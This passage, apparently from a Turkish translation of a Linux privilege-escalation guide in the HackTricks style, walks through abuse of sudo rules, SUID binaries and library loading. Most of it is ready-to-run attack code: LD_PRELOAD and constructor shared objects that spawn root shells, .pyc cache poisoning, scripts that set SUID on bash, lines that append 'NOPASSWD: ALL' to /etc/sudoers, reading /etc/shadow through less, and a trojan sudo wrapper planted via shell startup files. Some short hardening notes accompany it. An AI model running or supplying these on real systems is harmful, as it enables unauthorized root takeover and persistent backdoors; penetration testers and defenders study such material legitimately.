Çağıranın dilimlenecek `.3mf` projeyi seçebildiği durumlarda, `prusaslicer` veya `prusa-slicer` için kısıtlamasız, root yetkisiyle çalıştırılabilen bir sudo izni incelenmelidir. Bir proje, G-code dışa aktarılırken çalışan bir post-processing script'i içerebilir; hazırlanmış projeler 2.6.1'e kadar PrusaSlicer üzerinden komut çalıştırabilir ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Yetki sınırına ulaşılabildiği sonucuna varmadan önce etkin sudo kuralını, binary sürümünü ve üretici yamalarını, projenin kaynağını ve ilgili dışa aktarma yolunun çalışıp çalışmadığını doğrulayın. Sabit bir proje argümanı veya etkin bir `NOEXEC` ilkesi sonucu değiştirebilir. Yalnızca slicer'ın kurulu olduğunu tespit etmek, bir yetki yükseltme yolu olduğunu kanıtlamaz.

### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Bu örnek, **HTB makinesi Admirer** temel alınarak hazırlanmıştır ve script'i root olarak çalıştırırken rastgele bir Python kütüphanesi yüklemek için **PYTHONPATH hijacking** saldırısına **açıktı**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo ile çalıştırılmasına izin verilen Python import'larında yazılabilir `__pycache__` / `.pyc` poisoning

**sudo ile çalıştırılmasına izin verilen bir Python script'i**, paket dizininde **yazılabilir bir `__pycache__`** bulunan bir modülü import ediyorsa, önbelleğe alınmış `.pyc` dosyasını değiştirebilir ve sonraki import'ta ayrıcalıklı kullanıcı olarak code execution elde edebilirsiniz.<sup>[[30]](#references)</sup>

- Neden işe yarar:
  - CPython, bytecode önbelleklerini `__pycache__/module.cpython-<ver>.pyc` konumunda saklar.<sup>[[31]](#references)</sup>
  - Interpreter, **header**'ı (magic + kaynak dosyayla ilişkili timestamp/hash metadata'sı) doğrular, ardından header'dan sonra saklanan marshaled code object'i çalıştırır.
  - Dizin yazılabilir olduğu için önbelleğe alınmış dosyayı **silip yeniden oluşturabiliyorsanız**, root'a ait ancak yazılamayan bir `.pyc` dosyası yine de değiştirilebilir.
- Tipik yol:
  - `sudo -l`, root olarak çalıştırabileceğiniz bir Python script'i veya wrapper gösterir.
  - Bu script, `/opt/app/`, `/usr/local/lib/...` vb. konumlardaki yerel bir modülü import eder.
  - Import edilen modülün `__pycache__` dizini kullanıcınız veya herkes tarafından yazılabilir durumdadır.

Hızlı keşif:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ayrıcalıklı betiği inceleyebiliyorsanız, içe aktarılan modülleri ve önbellek yolunu belirleyin:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Abuse workflow:

1. Python'ın henüz mevcut değilse meşru cache dosyasını oluşturması için sudo izni olan script'i bir kez çalıştırın.
2. Meşru `.pyc` dosyasının ilk 16 baytını okuyup zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, özgün cache dosyasını silin ve özgün header ile kötü amaçlı bytecode'u birleştirerek dosyayı yeniden oluşturun.
4. Payload'unuzu root olarak çalıştırması için sudo izni olan script'i yeniden çalıştırın.

Önemli notlar:

- Özgün header'ı yeniden kullanmak önemlidir; çünkü Python, bytecode gövdesinin gerçekten kaynak dosyayla eşleşip eşleşmediğini değil, cache metadata'sının kaynak dosyayla eşleşip eşleşmediğini kontrol eder.
- Bu yöntem özellikle kaynak dosyası root'a ait ve yazılamaz, ancak onu içeren `__pycache__` dizini yazılabilir olduğunda kullanışlıdır.
- `PYTHONDONTWRITEBYTECODE=1` ve `python -B`, Python'ın yeni `.pyc` dosyaları yazmasını engeller; zaten geçerli olan ve saldırgan tarafından değiştirilmiş bir cache dosyasını yüklemesini **engellemez**. Kritik sınır, düşük yetkili bir kullanıcının ayrıcalıklı import'un kabul edeceği bir cache dosyasını değiştirip değiştiremeyeceğidir. Python, cache'lenmiş bytecode'u yüklemeden önce zaman damgası/boyut veya hash metadata'sını kontrol eder. [Python import başvurusuna](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) ve [komut satırı belgelerine](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) bakın.

Minimal proof-of-concept yapısı:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Ayrıcalıklı Python import path'indeki hiçbir dizinin, `__pycache__` dahil, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Mevcut `.pyc` dosyaları dahil, önbellek dizinlerinin sahipliğini ve izinlerini denetleyin. Bytecode yazmayı devre dışı bırakmak yeni önbellek oluşturulmasını azaltabilir, ancak değiştirilebilir mevcut bir önbelleği etkisiz hâle getirmez.
- Yazılabilir yerel Python modüllerini ve yazılabilir önbellek dizinlerini, root tarafından çalıştırılan yazılabilir shell script'leri veya paylaşılan kütüphaneler gibi değerlendirin.

### sudo env_keep üzerinden korunan BASH_ENV → root shell

sudoers, `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çalıştırırken Bash'in etkileşimsiz başlangıç davranışından yararlanarak root olarak istediğiniz kodu çalıştırabilirsiniz.<sup>[[24]](#references)</sup>

- Nasıl çalışır: Etkileşimsiz shell'lerde Bash, hedef script'i çalıştırmadan önce `$BASH_ENV` değişkenini değerlendirir ve belirtilen dosyayı kaynak olarak yükler. Birçok sudo kuralı, bir script'in veya shell wrapper'ın çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunuyorsa, dosyanız root ayrıcalıklarıyla kaynak olarak yüklenir.<sup>[[23]](#references)</sup>

- Gereksinimler:
  - Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz olarak `/bin/bash` çağıran herhangi bir hedef veya herhangi bir bash script'i).
  - `BASH_ENV` değişkeninin `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Güvenliği güçlendirme:
  - `BASH_ENV` (ve `ENV`) değişkenlerini `env_keep` listesinden çıkarın, `env_reset` kullanmayı tercih edin.
  - `sudo` ile izin verilen komutlarda shell wrapper’ları kullanmaktan kaçının; minimal binary’leri tercih edin.
  - Korunan env değişkenleri kullanıldığında sudo I/O logging ve alerting kullanmayı değerlendirin.

### Korunan HOME ile sudo üzerinden Terraform (!env_reset)

`sudo`, Terraform’ın daha yetkili bir kullanıcı olarak çalıştırılmasına izin verdiğinde, `!env_reset` hangi environment variable’ların ilgili kuralda gerçekten korunduğunu kontrol etmek için bir ipucudur. Çağıranın yazabildiği `.terraformrc` veya `terraform.rc` dosyasını etkin CLI yapılandırması olarak kabul etmeden önce, geçerli `HOME` veya `TF_CLI_CONFIG_FILE` değerini doğrulayın. `provider_installation.dev_overrides` girdisi yalnızca sabit Terraform komutu ilgili provider’ı yüklerse ve çağıran executable dosyasını seçilen dizine yerleştirebilirse önem taşır.<sup>[[25]](#references)</sup>

- Gerekli provider’ı yazılabilir bir dizine yönlendirin ve provider’ın adını taşıyan kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform, Go plugin el sıkışması başarısız olsa da ölmeden önce payload'ı root olarak çalıştırır ve geride bir SUID shell bırakır.

### TF_VAR override'ları + symlink doğrulamasını atlatma

Terraform değişkenleri, belirli sudo kuralı bu değişkenleri koruyorsa `TF_VAR_<name>` ortam değişkenleri aracılığıyla sağlanabilir. Kaynak symlink'inden **okuma** için ayrıca bağlantıyı izleyen ve korumalı sonucu çağıranın okuyabileceği bir hedefe kopyalayan bir provider gerekir. Hedef symlink'ine **yazma** ise ayrı olarak, çağıranın kontrolündeki bir hedef girdisi ve yazma sırasında bu girdiyi izleyen ayrıcalıklı bir provider gerektirir; sonradan çalışan zamanlanmış bir iş bunun olası sonuçlarından yalnızca biridir. Bu yollardan herhangi birini test etmeden önce `sudo -l`, `stat` ve `readlink` gibi salt okunur komutlarla sudo iznini, ilgili `.tf` dosyalarını, seçili CLI yapılandırmasını ve yolların sahipliğini inceleyin. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf, sözdizimsel doğrulamalar symlink'leri çözümlemez:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform, symlink'i çözümler ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef symlink'leri önceden oluşturarak ayrıcalıklı konumlara **yazmak** için de kullanılabilir (ör. sağlayıcının hedef yolunu `/etc/cron.d/` içini gösterecek şekilde ayarlamak).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, `requiretty` ile yapılandırılabilir; bu seçenek sudo'nun yalnızca etkileşimli bir TTY'den çalıştırılmasını zorunlu kılar. `!requiretty` ayarlanmışsa (veya seçenek yoksa), sudo reverse shell, cron job veya script gibi etkileşimsiz bağlamlardan çalıştırılabilir.

```bash
Defaults !requiretty
```

Bu tek başına doğrudan bir güvenlik açığı değildir; ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları artırır.

### Sudo env_keep+=PATH / güvensiz secure_path → PATH hijack

`sudo -l` çıktısında `env_keep+=PATH` veya saldırganın yazabildiği girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) görünüyorsa, sudo tarafından çalıştırılmasına izin verilen hedefteki nitelendirilmemiş bir harici komutun önüne başka bir komut geçirilebilir.<sup>[[3]](#references)</sup> Etkin bir `secure_path` bulunmaması da, **yalnızca** sudo ortamı çağıranın kontrolündeki bir `PATH` değerini koruyorsa incelenmelidir; tek başına bu eksiklik, böyle olduğunu kanıtlamaz. İzin verilen betiği çalıştırmadan okuyun; ardından tam RunAs ve argüman kuralını, etkin komut arama yolunu ve komut adıyla eşleşen, daha önce aranan, yazılabilir ve içinden geçilebilir bir dizin olup olmadığını doğrulayın. Kimlik doğrulama, `NOEXEC`, shell builtins ve mutlak komut yolları sonucu değiştirebilir.

- Gereksinimler: mutlak yollar kullanmadan (`free`, `df`, `ps` vb.) komut çalıştıran bir betiği/ikili dosyayı yürüten bir sudo kuralı (çoğunlukla `NOPASSWD`) ve ilk sırada aranan yazılabilir bir `PATH` girdisi.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo yürütmesinde yolları atlatma
Diğer dosyaları okumak veya **symlinks** kullanmak için **Jump** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Bir **joker karakter** (\*) kullanılırsa, daha da kolaydır:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu belirtilmeden sudo komutu/SUID binary

**sudo izni** tek bir komut için **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bunu istismar edebilirsiniz.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Bu teknik, **suid** binary **çalıştıracağı komutun yolunu belirtmeden başka bir komut çalıştırıyorsa da kullanılabilir (garip bir SUID binary'nin içeriğini her zaman** _**strings**_ **ile kontrol edin)**.

[Çalıştırılacak payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yoluna sahip SUID binary

**suid** binary **yolu belirterek başka bir komut çalıştırıyorsa**, suid dosyasının çağırdığı komutun adıyla bir **function export etmeyi** deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, function'ı oluşturup export etmeyi denemelisiniz:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Ardından, SUID binary'yi çağırdığınızda bu fonksiyon yürütülür

### Özel SUID kopyalama wrapper'ları

Kaynağı ve hedef yolu kabul eden, root sahipli bir SUID aracı iki farklı güven sınırını aşabilir. Her iki argümandan da bir shell komutu oluşturursa (örneğin, oluşturulmuş bir `cp` komutunu `system()`'e ileterek), shell metakarakterleri başka bir komutu aracın etkin ayrıcalıklarıyla çalıştırabilir. Shell kullanmadan `cp`'yi güvenli şekilde çağırsı bile, kısıtlanmamış bir hedef `/etc/passwd` gibi dosyalara ayrıcalıklı yazma olanağı sağlayabilir. Wrapper'ın argüman işleme biçimini, effective UID davranışını, hedef kısıtlamalarını ve kopyalanan dosyanın içeriğinin çağıran tarafından belirlenip belirlenemediğini inceleyin; genel bir `cp` hatası veya tek başına SUID biti, bu yollardan herhangi birinin varlığını kanıtlamaz. Herhangi bir manuel test yapmadan önce binary'yi ve izinlerini pasif olarak listeleyin.

### SUID wrapper tarafından yürütülen yazılabilir script

Yaygın bir özel uygulama yanlış yapılandırması, root sahipli bir SUID binary wrapper'ın düşük ayrıcalıklı kullanıcılar tarafından yazılabilir bir script'i yürütmesidir.

Tipik örüntü:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutları ekleyip ardından SUID wrapper'ı çalıştırabilirsiniz:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Hızlı kontroller:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Bu saldırı yolu, özellikle `/usr/local/bin` dizininde bulunan "maintenance"/"backup" wrapper'larında yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyici tarafından diğer tüm kütüphanelerden önce yüklenmesi için bir veya daha fazla paylaşımlı kütüphaneyi (.so dosyaları) belirtmek amacıyla kullanılır. Bu işlem, bir kütüphaneyi önceden yükleme olarak bilinir.

Ancak sistem güvenliğini korumak ve bu özelliğin, özellikle **suid/sgid** yürütülebilir dosyalarında kötüye kullanılmasını önlemek için sistem belirli koşullar uygular:

- Gerçek kullanıcı kimliği (_ruid_) etkin kullanıcı kimliğiyle (_euid_) eşleşmeyen yürütülebilir dosyalarda yükleyici **LD_PRELOAD**'u dikkate almaz.
- suid/sgid bitine sahip yürütülebilir dosyalarda yalnızca standart yollarda bulunan ve kendileri de suid/sgid bitine sahip olan kütüphaneler önceden yüklenir.

`sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa ayrıcalık yükseltme mümkün olabilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin korunmasına ve komutlar `sudo` ile çalıştırıldığında da dikkate alınmasına izin verir; bu da yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Şu adla kaydedin: **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Ardından **şu komutla derleyin**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Son olarak, **yetkileri yükseltin** çalıştırarak

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Saldırgan, kütüphanelerin aranacağı yolu kontrol ettiği için **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa benzer bir privesc yönteminden yararlanabilir.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Alışılmadık görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, exploit için potansiyel olduğunu gösterir.

Bunu exploit etmek için _"/path/to/.config/libcalc.c"_ gibi bir C dosyası oluşturup içine aşağıdaki kodu eklemek gerekir:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Bu kod, derlenip çalıştırıldığında, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını şu komutla bir shared object (.so) dosyasına derleyin:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Son olarak, etkilenen SUID binary’sini çalıştırmak exploit’i tetikleyerek sistemin potansiyel olarak ele geçirilmesine olanak tanır.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Artık yazabildiğimiz bir klasörden kütüphane yükleyen bir SUID ikili dosyası bulduğumuza göre, gerekli adla kütüphaneyi bu klasörde oluşturalım:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Şunun gibi bir hata alırsanız:

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), saldırganların yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix binary'lerinin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir komuta **yalnızca argüman enjekte edebildiğiniz** durumlar için aynı işi görür.

Proje; kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya yüksek ayrıcalıkları sürdürmek, dosya aktarmak, bind ve reverse shell'ler başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix binary'lerinin meşru işlevlerini derler.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralını nasıl istismar edebileceğinizi bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**sudo erişiminiz** olup parolaya sahip olmadığınız durumlarda, **bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıklarınızı yükseltebilirsiniz.<sup>[[18]](#references)</sup>

Ayrıcalıkları yükseltmek için gerekenler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" son **15 dakika içinde** bir şeyi çalıştırmak için **`sudo` kullanmış** (varsayılan olarak, bu süre sudo token'ının geçerlilik süresidir; bu token, parola girmeden `sudo` kullanmamızı sağlar)
- `cat /proc/sys/kernel/yama/ptrace_scope` çıktısı 0
- `gdb` erişilebilir durumda (yükleyebilmeniz yeterlidir)

(`ptrace_scope` değerini geçici olarak `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` komutuyla etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` ayarını yaparak kalıcı hâle getirebilirsiniz.)

Tüm bu gereksinimler karşılanıyorsa, **ayrıcalıklarınızı şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` binary'sini oluşturur. Bunu **oturumunuzda sudo token'ını etkinleştirmek** için kullanabilirsiniz (otomatik olarak root shell'i edinmezsiniz; `sudo su` komutunu çalıştırın):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root’a ait ve setuid ayarlı** bir sh shell oluşturur.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Üçüncü exploit** (`exploit_v3.sh`), **sudoers dosyası oluşturur**; bu dosya **sudo token'larını kalıcı hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Klasörde veya klasörün içindeki oluşturulmuş dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token oluşturmak** üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary'sini kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyorsanız ve bu kullanıcı olarak PID'si 1234 olan bir shell'iniz varsa, parolayı bilmenize gerek kalmadan **sudo ayrıcalıkları elde edebilirsiniz**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo` kullanabilecek kişileri ve kullanım şeklini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Bu** dosyayı **okuyabilirseniz**, **ilginç bilgiler edinebilirsiniz**; herhangi bir dosyaya **yazabilirseniz**, **yetki yükseltebilirsiniz**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Yazma izniniz varsa, bu izni kötüye kullanabilirsiniz.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Bu izinleri kötüye kullanmanın başka bir yolu:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD için `doas` gibi `sudo` ikilisinin bazı alternatifleri vardır. `/etc/doas.conf` dosyasındaki yapılandırmayı kontrol etmeyi unutmayın.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas` bir editöre veya yorumlayıcıya izin veriyorsa, GTFOBins tarzı kaçışları kontrol edin:

```bash
doas vim
:!/bin/sh
```

Root yetkisine sahip bir `doas` kuralı, orijinal Python tabanlı `dstat` için plugin yolu incelemesini de gerektirir. [Manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) ve [source](https://github.com/dstat-real/dstat/blob/master/dstat), `dstat_*.py` plugin'leri için kullanılan konumlar arasında `/usr/share/dstat/` ve `/usr/local/share/dstat/` dizinlerini listeler. Mevcut kullanıcı, kurulu build'in gerçekten kullandığı bir konuma yazma ve arama iznine sahipse seçilen bir plugin, `doas` RunAs kimliğiyle çalışabilir. Etkin kuralı, o build'deki plugin arama mekanizmasını, dizin ve üst dizin izinlerini veya ACL'leri ve çağıranın plugin seçip seçemediğini doğrulayın; yalnızca bir `dstat` kuralı veya yazılabilir dizin olması, bunun işe yarayacağını göstermez. Diğer `dstat` uygulamaları farklı plugin sistemleri kullanabilir. Plugin yüklemeden metadata'yı pasif biçimde inceleyin.

### Sudo Hijacking

Bir **kullanıcının genellikle makineye bağlanıp yetkilerini yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcının bağlamında bir shell elde ettiyseniz, kodunuzu root olarak, ardından da kullanıcının komutunu çalıştıracak **yeni bir sudo çalıştırılabilir dosyası** oluşturabilirsiniz. Ardından, kullanıcı `sudo` çalıştırdığında sizin sudo çalıştırılabilir dosyanızın çalışması için kullanıcının bağlamındaki **$PATH değerini değiştirin** (örneğin `.bash_profile` dosyasına yeni yolu ekleyerek).

Kullanıcı farklı bir shell (bash dışında) kullanıyorsa yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback), `~/.bashrc`, `~/.zshrc` ve `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) dosyasında bulabilirsiniz.

Ya da şöyle bir şey çalıştırabilirsiniz:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden geldiğini** belirtir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` konumundaki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin aranacağı** diğer klasörleri **işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** belirtilen yollardan herhangi birine yazma izni varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasör, bu kullanıcı ayrıcalıklarını yükseltebilir.\
Bu yanlış yapılandırmadan **nasıl yararlanılacağını** şu sayfada inceleyin:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

lib'i `/var/tmp/flag15/` dizinine kopyaladığınızda, `RPATH` değişkeninde belirtildiği üzere program bu konumdaki lib'i kullanır.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

